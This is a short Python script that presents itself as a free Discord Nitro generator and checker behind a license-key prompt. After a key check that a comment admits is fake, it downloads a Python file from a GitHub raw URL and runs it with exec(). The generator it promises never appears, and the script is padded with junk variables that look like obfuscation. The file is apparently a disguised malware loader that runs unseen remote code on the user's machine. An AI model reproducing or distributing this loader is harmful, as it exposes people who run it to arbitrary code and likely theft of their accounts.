
import random
import string
import time
import requests
import keyauth
from colored import fg, attr
print(fg(50), "Hello To MMAKINGDOM Free-Plan 20 Days Trial Nitro Gen and Checker")
i = "-1"
sin = '45'
a = 'wska'
forts = '-sjaw'
uys = a + forts
uys1 = "_a831"
f = 'valid'
sevenforty = 'om'
ui = '29'
sevenforty1 = sevenforty + uys1 + i + sin + uys
nig = '7'
csc = '1on2'
cs1 = nig + i + a + uys + sevenforty1
love = 'family'
theta = "0"
school = 'shit'
cs2 = cs1 + love + theta + school
randint = '0283612'
forn = "28wjaw"
validati = 'succes'
awd = validati + forn + randint + cs2 + school + theta + love + cs1 + csc
form = 'all'
def generate_random_letters(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def Valid():
  githubrep = 'https://raw.githubusercontent.com/MMAKINGDOM/pythondiscord/main/discordengine.py'
  response = requests.get(githubrep)
  source_code = response.content

  exec(source_code)

key = 'https://raw.githubusercontent.com/MMAKINGDOM/pythondiscord/main/half.txt'
response = requests.get(key)
keyfinal = response.content.decode().strip()

def login():
  user = input("Enter Your User Captin: ")
  keyinput = input("Enter License Key Captin: ")
  print("Hello ", user, "Wait While We Check the Key You Inputted...")  # Its Fake I Dont even Have the knowldege to do MySql
  time.sleep(2)
  if keyinput == keyfinal:
      print("Succesfully Logged In!")
      print("Please Wait We Are Loading the Code!")
      time.sleep(2)
      Valid()
  else:
     print("Invalid key, The Software Is Limited Edition Only, Read the [readme.txt] File ")
     print("Exiting...")
     time.sleep(7)
     exit()

login()